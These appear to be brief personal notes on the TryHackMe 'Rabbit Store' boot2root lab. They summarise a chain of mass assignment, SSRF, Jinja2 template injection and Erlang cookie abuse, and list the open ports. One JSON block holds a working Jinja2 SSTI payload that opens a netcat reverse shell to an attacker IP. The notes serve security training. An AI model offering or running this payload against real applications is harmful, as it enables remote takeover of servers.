
2025-04-03 14:44

Source: #Boot2root 
# TL;DR

**Rabbit Store** started with exploiting a **mass assignment vulnerability** to register an activated account, granting access to an API endpoint vulnerable to **SSRF**. Leveraging this **SSRF** vulnerability, we accessed the **API** documentation and discovered another endpoint vulnerable to **SSTI**, which we exploited to achieve **RCE** and gain a shell.

After obtaining a shell, we retrieved the **Erlang cookie**, which allowed us to enumerate the **RabbitMQ** instance and discover the password for the **root** user
# Real deal 

### Enum 

There are four open ports:

- **22** (`SSH`)
- **80** (`HTTP`)
- **4369** (`EPMD`)
- **25672** (`Erlang Distribution`)

On port 80 we are greeted w a login page 

 


Jinja [[SSTI]] 
```json
{"username":"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.17.62.140 1234 >/tmp/f').read() }}"}

```





### References
[TryHackMe | Rabbit Store](https://tryhackme.com/room/rabbitstore)

[Flask Jinja2 Pentesting | Exploit Notes](https://exploit-notes.hdks.org/exploit/web/framework/python/flask-jinja2-pentesting/)
[Rabbit Store | THM Writeup :: CyberJagadeesh - Learn Cyber Security](https://cyberjagadeesh.github.io/posts/thm/rabbitstore/writeup/)
[Reverse Shelling via Jinja2 SSTI using ngrok | by V!hanga D | Medium](https://medium.com/@dvihanga32/reverse-shell-via-jinja2-ssti-using-ngrok-514f6641b2ee)
https://www.rapid7.com/db/modules/exploit/multi/misc/erlang_cookie_rce/
https://jaxafed.github.io/posts/tryhackme-rabbit_store/#shell-as-root